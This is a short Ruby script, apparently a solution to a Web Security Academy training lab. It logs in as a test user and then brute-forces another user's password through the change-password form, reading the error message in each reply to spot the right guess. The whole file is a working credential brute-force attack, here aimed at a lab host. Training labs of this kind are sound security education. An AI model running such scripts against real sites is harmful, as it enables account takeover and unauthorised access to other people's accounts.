# frozen_string_literal: true

require 'uri'
require 'net/http'
require './valid_login'

TARGET = 'https://0ab6001e04e7b4fbc0701581003600b8.web-security-academy.net'

PASSWORDS = 'password_list.txt'
CANDIDATE = 'carlos'

# Used to reset login
valid_login = ValidLogin.new(uri: URI("#{TARGET}/login"), username: 'wiener', password: 'peter', success_code: '302')
                        .login
session = valid_login['set-cookie']
puts session
File.readlines(PASSWORDS).each do |line|
  l = line.strip
  res = Net::HTTP.post(URI("#{TARGET}/my-account/change-password"),
                       "username=#{CANDIDATE}&current-password=#{l}&new-password-1=any&new-password-2=any2",
                       { 'Content-Type' => 'application/x-www-form-urlencoded',
                         'Cookie' => session })
  puts "Tried #{CANDIDATE}:#{l}\tcode:#{res.code}"
  next if res.body.include?('<p class=is-warning>Current password is incorrect</p>')

  puts "#{CANDIDATE}:#{l}"
  break
end
